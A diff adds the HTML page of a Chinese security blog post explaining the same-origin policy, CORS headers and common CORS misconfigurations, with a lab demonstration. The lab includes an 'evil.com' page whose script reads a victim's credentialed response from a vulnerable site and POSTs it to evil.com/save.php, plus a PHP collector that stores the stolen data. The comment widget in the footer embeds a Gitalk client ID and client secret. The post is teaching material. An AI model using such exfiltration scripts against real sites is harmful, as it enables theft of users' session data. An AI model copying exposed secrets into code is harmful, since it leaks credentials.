@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>CORS跨域漏洞的学习 |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="CORS跨域漏洞的学习 |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="CORS跨域漏洞的学习"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/cors-kua-yu-lou-dong-de-xue-xi/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>CORS跨域漏洞的学习</h1>
+            <span class="meta">
+            	Posted on
+              2020-01-22，7 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>讲跨域漏洞前。首先得讲一下浏览器的同源策略<br>
+<strong>SOP，同源策略 (Same Origin Policy)</strong><br>
+同源策略是浏览器的一个安全功能。不同源的客户端脚本(JS)在没有被授权的情况下。不能读取对方资源。<br>
+同源的定义是。协议/端口/主机</p>
+<!-- more -->
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1579692178739.png" alt="" loading="lazy"></figure>
+<pre><code>假设www.test.com需要通过js去www.abc.com加载一张图片。在没有同源策略时。是没问题的。但是
+如果存在同源策略。test.com和abc.com不同域名。那么就会被禁止读取。那这让一些从网上加载资源的web就很难受。
+</code></pre>
+<p><strong>不受同源策略限制的</strong></p>
+<pre><code>1. 页面中的链接，重定向以及表单提交是不会受到同源策略限制的。
+2. 跨域资源的引入是可以的。但是js不能读写加载的内容。如嵌入到页面中的&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;，&lt;img&gt;，&lt;link&gt;，&lt;iframe&gt;等。
+</code></pre>
+<p><strong>CORS，跨域资源共享（Cross-origin resource sharing）</strong><br>
+是H5提供的一种机制。Web应用程序可以通过HTTP增加字段。来告诉浏览器。哪些不同来源的服务器是可以访问本站资源的。当不同域请求时。就出现了跨域资源共享<br>
+1：跨域访问的一些场景</p>
+<pre><code>后端开发完部分代码。提供接口给前端。前后分离的情况下。域名不同。需要跨域访问
+程序员在本地开发。本地的文件夹。并不是在一个域下。当js发送ajax请求。请求另外的页面时。就会跨域
+电商网站通过浏览器加载第三方快递物流信息
+子域名希望调用主域名的用户资料接口。显示数据
+</code></pre>
+<p><strong>CORS关键头部</strong><br>
+<code>Access-Control-Allow-Origin</code><br>
+指定哪些域可以访问当前域名。比如test.com想访问abc.com的资源。那么就要在abc.com服务器上设置Access-Control-Allow-Origin:test.com<br>
+即允许test.com访问<br>
+<code>Access-Control-Allow-Credentials</code><br>
+指定浏览器在请求时。是否可以携带cookie，可以就为True<br>
+<code>Access-Control-Allow-Methods</code><br>
+指定可以使用哪些方法(GET,POST)访问资源<br>
+<strong>常见的攻击场景</strong><br>
+<code>CORS错误配置</code><br>
+假设。我们是test.com向abc.com发送了请求。abc.com返回</p>
+<pre><code>HTTP/1.0 200 OK
+Access-Control-Allow-Origin: *
+#*说明任何域都可以访问资源
+Access-Control-Allow-Credentials: true
+#允许携带cookie
+</code></pre>
+<p>那么这就是个错误配置。并没有起到安全保护作用<br>
+<code>错误匹配不完整域名</code><br>
+继续请求。假设服务器返回如下</p>
+<pre><code>HTTP/1.0 200 OK
+Access-Control-Allow-Origin: requester.com
+Access-Control-Allow-Credentials: true
+</code></pre>
+<p>允许requester.com。但是没有写完整。让我们以下请求即可绕过</p>
+<pre><code>GET /api/userinfo.php
+Host: example.com
+Connection: close
+Origin: attackerrequester.com
+#存在requester.com
+</code></pre>
+<p>出现这种情况。都是后端在验证策略上采用了*requester.com来匹配<br>
+下面来说下CORS漏洞攻击流程。<br>
+假设用于登陆了一个有CORS的网站。同时又访问了攻击者的链接eval.com。<br>
+evil.com向vuln.com发起请求。获取敏感数据。浏览器能否接收消息。取决于vuln.com的配置。如果配置得当。不同域就不能获得数据<br>
+<strong>实验</strong><br>
+www.vuln.com<br>
+#web服务器<br>
+www.evil.com<br>
+#黑客服务器<br>
+当cookie设置为httponly属性后。没办法被js读取。但是phpinfo是有纪录的。我们就假设phpinfo是敏感信息。模拟登陆set-cookie后。访问敏感信息界面<br>
+www.vuln.com/login.php</p>
+<pre><code>&lt;?php
+//假设此页面需要登录后才能访问
+setcookie(&quot;SESSIONid&quot;,&quot;THISISSESSID20180802&quot;,time()+3600,&quot;&quot;,&quot;&quot;,0);  //设置普通Cookie
+setcookie(&quot;test_http&quot;,&quot;THISISSESSIDhttponly20180802&quot;,time()+3600,&quot;&quot;,&quot;&quot;,0,1);//设置HttpOnly Cookie
+?&gt;
+</code></pre>
+<p>www.vuln.com/secrect.php</p>
+<pre><code>&lt;? php
+//header(&quot;Access-Control-Allow-Origin:http://www.evil.com&quot;);
+//header(&quot;Access-Control-Allow-Credentials:true&quot;);
+phpinfo();
+#敏感信息
+?&gt;
+</code></pre>
+<p>先访问login.php。然后访问secrect.php。假设cookie是敏感信息<br>
+<img src="https://guokeya.github.io/post-images/1579693584130.png" alt="" loading="lazy"><br>
+此时黑客给了个恶意链接。用户访问<br>
+www.evil.com/steal.html</p>
+<pre><code>&lt;!DOCTYPE&gt;
+&lt;html&gt;
+&lt;h1&gt;Hello I evil page. &lt;/h1&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+function loadXMLDoc()
+{
+    var xhr1;
+    var xhr2;
+    if(window.XMLHttpRequest)
+    {
+        xhr1 = new XMLHttpRequest();
+        xhr2 = new XMLHttpRequest();
+        #新版本
+    }
+    else
+    {
+        xhr1 = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+        xhr2= new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+        #旧版本。主要是为了兼容
+    }
+    xhr1.onreadystatechange=function()
+    #判断xhr1有没有请求。当返回变化时。就会调用function
+    {
+        if(xhr1.readyState == 4 &amp;&amp; xhr1.status == 200) //if receive xhr1 response
+        {
+            var datas=xhr1.responseText;
+            #用户带着cookie请求的敏感信息
+            xhr2.open(&quot;POST&quot;,&quot;http://www.evil.com/save.php&quot;,&quot;true&quot;);
+            #保存本地
+            xhr2.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+            xhr2.send(&quot;T1=&quot;+escape(datas));      
+        }
+    }
+    xhr1.open(&quot;GET&quot;,&quot;http://www.vuln.com/secrect.php&quot;,&quot;true&quot;) //request user page.
+    xhr1.withCredentials = true;        //request with cookie
+    xhr1.send();
+    #请求完毕。onreadystatechange变化。调用上面的function
+}
+loadXMLDoc();
+&lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<p>www.evil.com/save.php</p>
+<pre><code>&lt;?php
+$myfile = fopen(&quot;secrect.html&quot;, &quot;w+&quot;) or die(&quot;Unable to open file!&quot;);
+$txt = $_POST['T1'];
+fwrite($myfile, $txt);
+fclose($myfile);
+?&gt;
+</code></pre>
+<p>由于用户访问了恶意链接。触发js脚本。js脚本请求了www.vuln的资源。浏览器自动为我们添加origin这个字段。用来说明我们是哪来的<br>
+<img src="https://guokeya.github.io/post-images/1579694158002.png" alt="" loading="lazy"><br>
+js脚本出现一个错误<br>
+<img src="https://guokeya.github.io/post-images/1579694926855.png" alt="" loading="lazy"><br>
+服务端缺少access-control-allow-origin头。所以浏览器就拦截了该请求<br>
+现在取消www.vuln.com/secrect.php的注释。允许www.evil.com访问<br>
+<img src="https://guokeya.github.io/post-images/1579694352498.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1579694407935.png" alt="" loading="lazy"><br>
+黑客收到了带有httponly的敏感信息<br>
+<img src="https://guokeya.github.io/post-images/1579694458736.png" alt="" loading="lazy"><br>
+<strong>XSS请求跨域</strong><br>
+假设我们我们主域名provider.com存在CORS。但是只允许requester.com的子域访问</p>
+<pre><code>if ($_SERVER['HTTP_HOST'] == '*.requester.com')
+ {
+  //Access data
+  else{ // unauthorized access}
+}
+</code></pre>
+<p>假设我们可以访问sub.requester.com但无法访问requester.com<br>
+并且sub.requester.com存在XSS。那么我们就可以通过CORS去请求provider.com的信息<br>
+原理同上<br>
+参考文章：<br>
+<code>https://www.freebuf.com/column/194652.html</code><br>
+<code>https://www.secshi.com/20298.html</code></p>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/swpuctf2019easy-pythonflask-session-wei-zao-ruan-lian-jie-ming-ling-zhi-xing-bypass/">
+              <span class="post-title">
+                [SWPUCTF2019]Easy Python(flask session伪造+软链接+命令执行bypass)&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br ><!--test--></a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
